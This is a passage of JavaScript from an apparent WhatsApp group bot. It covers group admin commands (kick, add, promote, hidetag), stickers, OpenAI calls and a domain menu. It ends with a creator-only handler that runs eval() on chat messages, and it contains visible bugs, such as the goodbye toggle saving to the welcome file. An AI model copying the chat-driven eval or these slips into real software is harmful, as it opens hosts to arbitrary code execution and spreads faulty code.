			if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isWelcome) return m.reply(`Udah on`)
                _welcome.push(m.chat)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
               m.reply('Sukses mengaktifkan welcome di grup ini')
            } else if (args[0] === "off") {
               if (!isWelcome) return m.reply(`Udah off`)
                let anu = _welcome.indexOf(m.chat)
               _welcome.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_welcome, null, 2))
               m.reply('Sukses menonaktifkan welcome di grup ini')
            } else {
                m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
			}
			quoted: ftroli
			}
            break
            
                    case'left': case 'goodbye':{
        	if ((global.left || isLeft)){ }
            if (!m.isGroup) return m.reply('Fitur Khusus Group!')
			if (!isAdmins) return m.reply('Fitur Khusus admin!')
            if (args[0] === "on") {
               if (isLeft) return m.reply(`Udah on`)
                _left.push(m.chat)
                fs.writeFileSync('./database/left.json', JSON.stringify(_left, null, 2))
                m.reply('Sukses mengaktifkan goodbye di grup ini')
            } else if (args[0] === "off") {
               if (!isLeft) return m.reply(`Udah off`)
                let anu = _left.indexOf(m.chat)
               _left.splice(anu, 1)
                fs.writeFileSync('./database/welcome.json', JSON.stringify(_left, null, 2))
                m.reply('Sukses menonaktifkan goodbye di grup ini')
            } else {
               m.reply(`Kirim perintah ${prefix + command} on/off\n\nContoh: ${prefix + command} on`)
            }
        }
        break
        


case 'antivirtex': {
                if (!m.isGroup) return m.reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antivirtex) return m.reply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antivirtex = true
                    m.reply(`Antilink TikTok Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antivirtex) return m.reply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antivirtex = false
                    m.reply(`Antilink TikTok Nonaktif 🕊️`)
                } else {
                    m.reply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            break
            
            case 'antilink': {
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return m.reply('Sudah Aktif')
antilink.push(from)
m.reply('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = antilink.indexOf(from)
antilink.splice(off, 1)
m.reply('Succes mematikan antilink di group ini 🌷')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
 
case 'linkgroup':

            case 'linkgrup':
            case 'linkgc': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let response = await yudamods.groupInviteCode(m.chat)
                yudamods.sendText(m.chat, `👥 *INFO LINK GROUP*\n📛 *Nama :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Tidak diketahui'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Link Chat :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, fgclink,  {
                    detectLink: true
                })
            }
            break          

case 'setname':
            case 'setsubject': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await yudamods.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setdesc':
            case 'setdesk': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                if (!text) return 'Text ?'
                await yudamods.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
            
            
                   case 'promote': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'demote': {
                if (!m.isGroup) return mess.group
                if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin
                if (!isBotAdmins) return mess.botAdmin
                let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await yudamods.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
         
         
                     case 'setppgroup':
            case 'setppgrup':
            case 'setppgc': {
            if (!m.isGroup) return m.reply(mess.group)
            if (!isAdmins) return m.reply(mess.admin)
            if (!isBotAdmins) return m.reply(mess.botAdmin)
            if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
            var mediz = await yudamods.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
            if (args[0] == `/panjang`) {
            var { img } = await generateProfilePicture(mediz)
            await yudamods.query({
            tag: 'iq',
            attrs: {
            to: m.chat,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            fs.unlinkSync(mediz)
            m.reply(`Sukses`)
            } else {
            var memeg = await yudamods.updateProfilePicture(m.chat, { url: mediz })
            fs.unlinkSync(mediz)
            m.reply(`Sukses`)
            }
            }
            break
         

case 'tagall':
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!q) return m.reply(`Teks?`)
let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
for (let mem of participants) {
teks_tagall += `⚘ @${mem.id.split('@')[0]}\n`
}
yudamods.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) })
break


 case 'h':
case 'hidetag':
case 'tag': {
      if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')  
yudamods.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break


case 'kick': {
if (!m.isGroup) return m.reply('Buat Di Group')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yudamods.groupParticipantsUpdate(from, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break


         case 'add': {
         	if (!m.isGroup) return m.reply("Hanya Dapat Di Gunakan Di Group")
         if (!isBotAdmins) return m.reply("Bot Bukan Admin")
         if (!isAdmins) return m.reply("Fitur Ini Hanya Dapat Di Gunakan Oleh Admin")
         let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
         await yudamods.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
         }
         break
         
         
                     case 'listonline':
            case 'liston': {
                if (!m.isGroup) m.reply(mess.group)
                let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                yudamods.sendText(m.chat, '⏰ List Online:\n\n' + online.map(v => '🌱 @' + v.replace(/@.+/, '')).join`\n`, ftroli, {
                    mentions: online
                })
            }
            break
         
         
         case 'gc': case 'group':
        if (!isGroupAdmins) return m.reply('Perintah ini hanya bisa digunakan oleh Admin Grup')  
      if (!q) return m.reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
  if (args[0] == "c") {
  yudamods.groupSettingUpdate(from, 'announcement')
  m.reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
  } else if (args[0] == "o") {
  yudamods.groupSettingUpdate(from, 'not_announcement')
  m.reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
  } else {
  m.reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
  }
  break


///BATAS CASE GRUP MENU


///CASE OTHER MENU


case 'sticker': case 's': case 'stickergif': case 'sgif': case 'stiker':{

	if (!quoted) throw `*Reply Video/Image With Caption* ${prefix + command}`
	if (/image/.test(mime)) {
		m.reply("Sedang Di Proses")
		let media = await quoted.download()
		let encmedia = await yudamods.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
		await fs.unlinkSync(encmedia)
		} else if (/video/.test(mime)) {
			if ((quoted.msg || quoted).seconds > 11) return reply('*Maximum 10 seconds!*')
			let media = await quoted.download()
			let encmedia = await yudamods.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
			await fs.unlinkSync(encmedia)
			} else {
				m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
				}
				}
				break
				
				
				case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	if (!isPremium && !isCreator) return m.reply (`Fitur Ini Khusus Member Premium, Jika Mau Buy Premium Ketik .Buyprem`)
	let { TelegraPh } = require('./lib/uploader')
	if (!text) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
	if (text.includes('|')) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
	if (!/image/.test(mime)) return m.reply(`Send/Reply Photo With Caption ${prefix + command} *text*`)
	m.reply("Sedang Di Proses")
	mee = await yudamods.downloadAndSaveMediaMessage(quoted)
	mem = await TelegraPh(mee)
	meme = `https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`
	smm = await yudamods.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
	await fs.unlinkSync(smm)
	}
	break
	
	
	 case 'qc': {
	 if (!isPremium) return m.reply(mess.premium)
            const { quote } = require('./lib/quoted.js')
            if (!q) return ('Masukan Text')
            let ppnyauser = await await yudamods.profilePictureUrl(m.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
            const rest = await quote(q, pushname, ppnyauser)
            m.reply('Sabar Cok Lagi Loading')
            yudamods.sendImageAsSticker(m.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
            }
            break
            
                   case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await yudamods.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            
            case "ai": case "openai":
          try {
            if (global.aipikey === "ISI_APIKEY_OPENAI_DISINI") return m.reply("Mohon Isi Api Di api_key.json");
            if (!text) return m.reply(`Chat dengan AI.\n\nContoh:\n${prefix}${command} Apa itu resesi`);
            const configuration = new Configuration({
              apiKey: global.aipikey,
            });
            const openai = new OpenAIApi(configuration);

            const response = await openai.createCompletion({
              model: "text-davinci-003",
              prompt: text,
              temperature: 0.3,
              max_tokens: 2000,
              top_p: 1.0,
              frequency_penalty: 0.0,
              presence_penalty: 0.0,
            });
            m.reply(`${response.data.choices[0].text}`);
          } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
          break;
          
          case "img": case "ai-img": case "image": case "images":
          try {
            if (global.aipikey === "ISI_APIKEY_OPENAI_DISINI") return m.reply("Mohon Isi Api Di api_key.json");
            if (!text) return m.reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Gamabar gunung`);
            const configuration = new Configuration({
              apiKey: global.aipikey,
            });
            const openai = new OpenAIApi(configuration);
            m.reply(mess.wait)
            const response = await openai.createImage({
              prompt: text,
              n: 1,
              size: "512x512",
            });
            //console.log(response.data.data[0].url)
            yudamods.sendImage(from, response.data.data[0].url, text, mek);
            } catch (error) {
          if (error.response) {
            console.log(error.response.status);
            console.log(error.response.data);
            console.log(`${error.response.status}\n\n${error.response.data}`);
          } else {
            console.log(error);
            m.reply("Maaf, sepertinya ada yang error :"+ error.message);
          }
        }
        break;
        
        case 'ping': case 'botstatus': case 'statusbot': {
            if (!isCreator) throw mess.owner
            const used = process.memoryUsage()
            const cpus = os.cpus().map(cpu => {
                cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
          return cpu
            })
            const cpu = cpus.reduce((last, cpu, _, { length }) => {
                last.total += cpu.total
                last.speed += cpu.speed / length
                last.times.user += cpu.times.user
                last.times.nice += cpu.times.nice
                last.times.sys += cpu.times.sys
                last.times.idle += cpu.times.idle
                last.times.irq += cpu.times.irq
                return last
            }, {
                speed: 0,
                total: 0,
                times: {
              user: 0,
              nice: 0,
              sys: 0,
              idle: 0,
              irq: 0
            }
            })
            let timestamp = speed()
            let latensi = speed() - timestamp
            neww = performance.now()
            oldd = performance.now()
            respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
            `.trim()
            m.reply(respon)
        }break
        
case 'domainmenu':
case 'domain':{
let domain = (`
– *Domain Menu*

┌ ◦ ${prefix}domain1  *[panellku.my.id]*
│ ◦ ${prefix}domain2  *[panellku.art]*
│ ◦ ${prefix}domain3  *[panellku.me]*
│ ◦ ${prefix}domain4  *[panellku.biz.id]*
│ ◦ ${prefix}domain5  *[panellku.tech]*
│ ◦ ${prefix}domain6  *[panelkuu.xyz]*
│ ◦ ${prefix}domain7  *[panellku.com]*
│ ◦ ${prefix}domain8  *[yasshost.com]*
│ ◦ ${prefix}domain9  *[yasshost.my.id]*
│ ◦ ${prefix}domain10  *[yasspedia.xyz]*
│ ◦ ${prefix}domain11  *[panelmurah.cfd]*
│ ◦ ${prefix}domain12  *[panelstore.xyz]*
│ ◦ ${prefix}domain13  *[panelstore.art]*
│ ◦ ${prefix}domain14  *[mypanel.biz.id]*
│ ◦ ${prefix}domain15  *[ofcbotku.com]*
│ ◦ ${prefix}domain16  *[panelonline.cfd]*
│ ◦ ${prefix}domain17  *[adwhost.my.id]*
│ ◦ ${prefix}domain18  *[adwpedia.xyz]*
│ ◦ ${prefix}domain19  *[fazzweb.my.id]*
│ ◦ ${prefix}domain20  *[fazzpedia.my.id]*
│ ◦ ${prefix}domain21  *[fazzhost.my.id]*
│ ◦ ${prefix}domain22  *[jasa-panel.my.id]*
│ ◦ ${prefix}domain23  *[didinsec.biz.id]*
│ ◦ ${prefix}domain24  *[didindev.my.id]*
│ ◦ ${prefix}domain25  *[sellerpannel.my.id]*
│ ◦ ${prefix}domain26  *[biistoreee.xyz]*
│ ◦ ${prefix}domain27  *[putraoffc.site]*
│ ◦ ${prefix}domain28  *[putraoffc.com]*
│ ◦ ${prefix}domain29  *[kangpannel.xyz]*
│ ◦ ${prefix}domain30  *[biistoreee.art]*
│ ◦ ${prefix}domain31  *[biistoreee.biz.id]*
│ ◦ ${prefix}domain32  *[biistoreee.cfd]*
│ ◦ ${prefix}domain33  *[biistoreee.com]*
│ ◦ ${prefix}domain34  *[biistoreee.icu]*
│ ◦ ${prefix}domain35  *[biistoreee.my.id]*
│ ◦ ${prefix}domain36  *[biistoreee.net]*
│ ◦ ${prefix}domain37  *[biistoreee.tech]*
│ ◦ ${prefix}domain38  *[panellstore.art]*
│ ◦ ${prefix}domain39  *[panellstore.cfd]*
│ ◦ ${prefix}domain40  *[panellstore.com]*
│ ◦ ${prefix}domain41  *[panellstore.icu]*
└ ◦ ${prefix}domain42  *[mypterodactylpanel.my.id]*`)
yudamods.sendMessage(m.chat, {
text: domain,
contextInfo: {
externalAdReply: {
title: yudamods,
body: 'bodynya',
thumbnailUrl: thumb,
sourceUrl: "https://chat.whatsapp.com/EKRAl9G9KyW0VpLD30clzZ",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}

break
        
                   case 'addgc':
if (!isGroup) return m.reply(mess.OnlyGroup)         
if (!isCreator) return m.reply(mess.OnlyOwner)
pler.push(m.chat)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
m.reply('Sukses the group can create a domain')
        break
  case 'delgc':
if (!isGroup) return m.reply(mess.OnlyGroup)         
if (!isCreator) return m.reply(mess.OnlyOwner)
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
        m.reply('the group can no longer access the domain')
        break
            


///BATAS CASE OTHER MENU



default:
}
if (budy.startsWith('>')) {
if (!isCreator) return m.reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})